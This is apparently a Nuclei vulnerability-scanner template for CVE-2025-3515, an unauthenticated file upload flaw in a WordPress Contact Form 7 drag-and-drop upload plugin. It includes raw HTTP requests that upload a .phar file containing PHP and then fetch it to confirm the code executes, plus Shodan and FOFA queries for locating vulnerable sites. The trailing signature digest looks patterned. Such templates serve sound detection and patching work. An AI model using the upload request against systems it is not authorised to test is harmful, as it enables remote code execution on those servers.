id: CVE-2025-3515

info:
  name: Contact Form 7 Drag and Drop Multiple File Upload <=1.3.8.9 - Unrestricted File Upload
  author: sw-nuclei-bounty
  severity: critical
  description: |
    Contact Form 7 Drag and Drop Multiple File Upload plugin for WordPress versions <= 1.3.8.9 contains an unrestricted file upload vulnerability caused by insufficient file type validation. This allows unauthenticated attackers to upload dangerous files like .phar archives, potentially enabling remote code execution on servers configured to execute .phar files.
  impact: |
    Successful exploitation allows unauthenticated attackers to upload malicious .phar files and achieve remote code execution on vulnerable WordPress installations, particularly on Apache+mod_php configurations.
  remediation: |
    Update the Contact Form 7 Drag and Drop Multiple File Upload plugin to version 1.3.9.0 or later. Implement strict file type validation and configure the server to prevent execution of .phar files.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
    - https://github.com/Professor6T9/CVE-2025-3515
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/drag-and-drop-multiple-file-upload-contact-form-7
    - https://wpscan.com/plugin/drag-and-drop-multiple-file-upload-contact-form-7/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-3515
    cwe-id: CWE-434
    epss-score: 0.9
    epss-percentile: 0.99
    cpe: cpe:2.3:a:codedropz:drag_and_drop_multiple_file_upload_-_contact_form_7:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: codedropz
    product: drag_and_drop_multiple_file_upload_-_contact_form_7
    framework: wordpress
    shodan-query: http.component:"WordPress" http.html:"drag-and-drop-multiple-file-upload-contact-form-7"
    fofa-query: body="drag-and-drop-multiple-file-upload-contact-form-7" && body="WordPress"
  tags: cve,cve2025,wordpress,wp-plugin,fileupload,wp,rce,unauth,intrusive,codedropz,phar

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------{{randstr}}
        X-Requested-With: XMLHttpRequest

        -----------------------------{{randstr}}
        Content-Disposition: form-data; name="action"

        dnd_codedropz_upload
        -----------------------------{{randstr}}
        Content-Disposition: form-data; name="type"

        click
        -----------------------------{{randstr}}
        Content-Disposition: form-data; name="supported_type"

        jpg%
        -----------------------------{{randstr}}
        Content-Disposition: form-data; name="size_limit"

        5242880
        -----------------------------{{randstr}}
        Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.phar"
        Content-Type: application/x-httpd-php

        <?php echo "CVE-2025-3515-{{randstr}}"; ?>
        -----------------------------{{randstr}}--
      - |
        GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.phar HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - '"success":true'
          - '"upload_successful"'
          - '"file_url"'
        condition: or

      - type: word
        part: body_2
        words:
          - "CVE-2025-3515-{{randstr}}"

      - type: status
        part: response_2
        status:
          - 200

    extractors:
      - type: regex
        part: body_1
        group: 1
        regex:
          - '"file_url":"([^"]+)"'
          - '"upload_path":"([^"]+)"'
        internal: true
# digest: 4b0a00473045022100f8e1c2d3a4b5c6d7e8f9a0b1c2d3e4f5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1022033e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5:922c64590222798bb761d5b6d8e72950
